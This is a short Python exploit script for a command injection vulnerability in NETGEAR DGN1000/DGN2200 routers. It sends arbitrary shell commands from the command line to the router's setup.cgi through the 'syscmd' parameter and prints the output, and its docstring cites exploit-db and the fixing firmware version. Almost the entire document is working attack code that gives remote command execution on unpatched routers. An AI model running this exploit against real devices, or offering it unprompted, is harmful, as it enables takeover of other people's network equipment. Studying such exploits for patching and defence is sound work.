import urllib.request
import sys

"""
This script uses a command injection vulnerability in NETGEAR DGN1000/DGN2200 to execute a single command on the router.
The vulnerability is fixed in firmware version 1.1.00.48.
See https://www.exploit-db.com/exploits/25978/ for more information.
"""

router_ip = "192.168.0.1"


def run_command(cmd):
    r = urllib.request.urlopen(
        "http://{}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}"
        "&curpath=/&currentsetting.htm=1".format(
            router_ip, urllib.parse.quote(cmd)
        )
    )
    print("{} > {}".format(router_ip, cmd))
    for line in r.readlines():
        print(line.decode('utf-8', 'ignore').rstrip())
    print()

if __name__ == "__main__":
    cmd = ""
    for x in sys.argv[1:]:
        cmd+=" "+x
    run_command(cmd)
